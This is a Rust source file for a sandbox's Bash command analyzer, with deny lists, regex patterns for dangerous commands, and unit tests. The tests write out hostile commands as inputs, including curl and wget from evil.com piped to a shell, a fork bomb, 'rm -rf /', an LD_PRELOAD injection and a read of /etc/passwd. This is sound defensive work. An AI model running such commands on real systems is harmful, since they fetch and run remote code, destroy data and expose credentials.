use regex::Regex;
use wf_types::script::sandbox::ShellPolicy;

use super::base::{ShellAnalysisContext, ShellAnalysisResult, ShellAnalyzer, ShellType};

const SHELL_TYPE: ShellType = ShellType::Bash;

const DENIED_COMMANDS: &[&str] = &[
    "sudo",
    "su",
    "chroot",
    "mount",
    "umount",
    "dd",
    "mkfs",
    "reboot",
    "shutdown",
    "poweroff",
    "halt",
    "passwd",
    "useradd",
    "userdel",
    "usermod",
    "groupadd",
    "groupdel",
    "groupmod",
    "lvremove",
    "pvremove",
    "ifdown",
    "ifup",
    "killall",
    "pkill",
    "service",
    "systemctl",
    "insmod",
    "modprobe",
    "modprobe.d",
    "depmod",
    "swapon",
    "swapoff",
];

pub const DANGEROUS_PATTERNS: &[&str] = &[
    r"rm\s+(-rf?|--recursive)\s+/",
    r":?\(\)\s*\{.*:\s*:\s*\};?:",
    r"curl.*\|\s*(ba)?sh",
    r"wget.*\|\s*(ba)?sh",
    r"LD_PRELOAD=",
    r"LD_LIBRARY_PATH=",
    r"mkfs\s+",
    r"dd\s+if=",
    r"chroot\s+",
    r"SUDO_ASKPASS=",
    r"SUDO_PASSWORD=",
    r"insmod\s+",
    r"modprobe\s+",
    r"dd\s+of=/dev/",
];

const PREFIX_COMMANDS: &[&str] = &["time", "env", "nice", "nohup", "command", "\\"];

pub struct BashAnalyzer;

struct ResolvedShellPolicy {
    allowed_commands: Vec<String>,
    denied_commands: Vec<String>,
    dangerous_patterns: Vec<String>,
    allow_pipe: bool,
    allow_redirect: bool,
}

impl BashAnalyzer {
    fn resolve_policy(&self, policy: &ShellPolicy) -> ResolvedShellPolicy {
        ResolvedShellPolicy {
            allowed_commands: policy.allowed_commands.clone().unwrap_or_default(),
            denied_commands: policy
                .denied_commands
                .clone()
                .unwrap_or_else(|| DENIED_COMMANDS.iter().map(|s| s.to_string()).collect()),
            dangerous_patterns: policy
                .dangerous_patterns
                .clone()
                .unwrap_or_else(|| DANGEROUS_PATTERNS.iter().map(|s| s.to_string()).collect()),
            allow_pipe: policy.allow_pipe.unwrap_or(true),
            allow_redirect: policy.allow_redirect.unwrap_or(true),
        }
    }

    fn extract_primary_command(&self, command: &str) -> Option<String> {
        let trimmed = command.trim();
        if trimmed.is_empty() {
            return None;
        }

        let tokens: Vec<&str> = trimmed.split_whitespace().collect();
        let mut idx = 0;

        while idx < tokens.len() && PREFIX_COMMANDS.contains(&tokens[idx]) {
            idx += 1;
        }

        tokens.get(idx).map(|s| {
            s.chars()
                .filter(|c| {
                    c.is_alphanumeric()
                        || *c == '_'
                        || *c == '-'
                        || *c == '.'
                        || *c == '/'
                        || *c == '\\'
                })
                .collect()
        })
    }
}

impl ShellAnalyzer for BashAnalyzer {
    fn shell_type(&self) -> ShellType {
        SHELL_TYPE
    }

    fn analyze(&self, ctx: &ShellAnalysisContext) -> ShellAnalysisResult {
        let policy = self.resolve_policy(ctx.policy);

        let primary = self.extract_primary_command(ctx.command);
        let primary = match primary {
            Some(p) if !p.is_empty() => p,
            _ => {
                return ShellAnalysisResult {
                    allowed: false,
                    reason: Some("Empty command".to_string()),
                    command: ctx.command.to_string(),
                    shell_type: SHELL_TYPE,
                };
            }
        };

        if !policy.allowed_commands.is_empty() && !policy.allowed_commands.contains(&primary) {
            return ShellAnalysisResult {
                allowed: false,
                reason: Some(format!("Command not in whitelist: {primary}")),
                command: ctx.command.to_string(),
                shell_type: SHELL_TYPE,
            };
        }

        if policy.denied_commands.contains(&primary) {
            return ShellAnalysisResult {
                allowed: false,
                reason: Some(format!("Command denied by blacklist: {primary}")),
                command: ctx.command.to_string(),
                shell_type: SHELL_TYPE,
            };
        }

        for pattern in policy.dangerous_patterns {
            if let Ok(re) = Regex::new(&pattern) {
                if re.is_match(ctx.command) {
                    return ShellAnalysisResult {
                        allowed: false,
                        reason: Some(format!("Dangerous pattern detected: {pattern}")),
                        command: ctx.command.to_string(),
                        shell_type: SHELL_TYPE,
                    };
                }
            }
        }

        if !policy.allow_pipe && ctx.command.contains('|') {
            return ShellAnalysisResult {
                allowed: false,
                reason: Some("Pipe operator is not allowed".to_string()),
                command: ctx.command.to_string(),
                shell_type: SHELL_TYPE,
            };
        }

        if !policy.allow_redirect && (ctx.command.contains('<') || ctx.command.contains('>')) {
            return ShellAnalysisResult {
                allowed: false,
                reason: Some("Redirect operator is not allowed".to_string()),
                command: ctx.command.to_string(),
                shell_type: SHELL_TYPE,
            };
        }

        ShellAnalysisResult {
            allowed: true,
            reason: None,
            command: ctx.command.to_string(),
            shell_type: SHELL_TYPE,
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use wf_types::script::sandbox::ShellPolicy;

    fn empty_policy() -> ShellPolicy {
        ShellPolicy {
            allowed_commands: None,
            denied_commands: None,
            dangerous_patterns: None,
            allow_pipe: None,
            allow_redirect: None,
        }
    }

    fn analyzer() -> BashAnalyzer {
        BashAnalyzer
    }

    fn analyze(cmd: &str, policy: &ShellPolicy) -> ShellAnalysisResult {
        let ctx = ShellAnalysisContext {
            command: cmd,
            policy,
        };
        analyzer().analyze(&ctx)
    }

    #[test]
    fn test_bash_analyzer_shell_type() {
        assert_eq!(analyzer().shell_type(), ShellType::Bash);
    }

    #[test]
    fn test_allows_safe_command() {
        let result = analyze("echo hello", &empty_policy());
        assert!(result.allowed);
    }

    #[test]
    fn test_denies_sudo() {
        let result = analyze("sudo rm -rf /", &empty_policy());
        assert!(!result.allowed);
        assert!(result.reason.unwrap().contains("sudo"));
    }

    #[test]
    fn test_denies_su() {
        let result = analyze("su - root", &empty_policy());
        assert!(!result.allowed);
    }

    #[test]
    fn test_denies_chroot() {
        let result = analyze("chroot /newroot", &empty_policy());
        assert!(!result.allowed);
    }

    #[test]
    fn test_denies_dangerous_rm() {
        let result = analyze("rm -rf /", &empty_policy());
        assert!(!result.allowed);
        assert!(result.reason.unwrap().contains("Dangerous pattern"));
    }

    #[test]
    fn test_denies_curl_pipe_bash() {
        let result = analyze("curl http://evil.com | bash", &empty_policy());
        assert!(!result.allowed);
    }

    #[test]
    fn test_denies_wget_pipe_sh() {
        let result = analyze("wget http://evil.com | sh", &empty_policy());
        assert!(!result.allowed);
    }

    #[test]
    fn test_denies_fork_bomb() {
        let result = analyze(":(){ :|:& };:", &empty_policy());
        assert!(!result.allowed);
    }

    #[test]
    fn test_denies_ld_preload() {
        let result = analyze("LD_PRELOAD=/malicious.so some_program", &empty_policy());
        assert!(!result.allowed);
    }

    #[test]
    fn test_whitelist_denies_outside() {
        let policy = ShellPolicy {
            allowed_commands: Some(vec!["ls".to_string(), "echo".to_string()]),
            denied_commands: None,
            dangerous_patterns: None,
            allow_pipe: None,
            allow_redirect: None,
        };
        let result = analyze("cat /etc/passwd", &policy);
        assert!(!result.allowed);
        assert!(result.reason.unwrap().contains("whitelist"));
    }

    #[test]
    fn test_whitelist_allows_safe() {
        let policy = ShellPolicy {
            allowed_commands: Some(vec!["ls".to_string()]),
            denied_commands: None,
            dangerous_patterns: None,
            allow_pipe: None,
            allow_redirect: None,
        };
        let result = analyze("ls -la", &policy);
        assert!(result.allowed);
    }

    #[test]
    fn test_denies_mkfs() {
        let result = analyze("mkfs ext4 /dev/sda1", &empty_policy());
        assert!(!result.allowed);
    }

    #[test]
    fn test_denies_dd_if() {
        let result = analyze("dd if=/dev/sda of=/output bs=4M", &empty_policy());
        assert!(!result.allowed);
    }

    #[test]
    fn test_denies_systemctl() {
        let result = analyze("systemctl start some-service", &empty_policy());
        assert!(!result.allowed);
    }

    #[test]
    fn test_empty_command() {
        let result = analyze("", &empty_policy());
        assert!(!result.allowed);
        assert!(result.reason.unwrap().contains("Empty command"));
    }

    #[test]
    fn test_allow_pipe_false() {
        let policy = ShellPolicy {
            allowed_commands: None,
            denied_commands: None,
            dangerous_patterns: None,
            allow_pipe: Some(false),
            allow_redirect: None,
        };
        let result = analyze("echo a | grep a", &policy);
        assert!(!result.allowed);
        assert!(result.reason.unwrap().contains("Pipe"));
    }

    #[test]
    fn test_redirect_disallowed() {
        let policy = ShellPolicy {
            allowed_commands: None,
            denied_commands: None,
            dangerous_patterns: None,
            allow_pipe: None,
            allow_redirect: Some(false),
        };
        let result = analyze("echo hello > /tmp/file", &policy);
        assert!(!result.allowed);
        assert!(result.reason.unwrap().contains("Redirect"));
    }

    #[test]
    fn test_prefix_commands_skipped() {
        let result = analyze("time env ls", &empty_policy());
        assert!(result.allowed);
    }
}
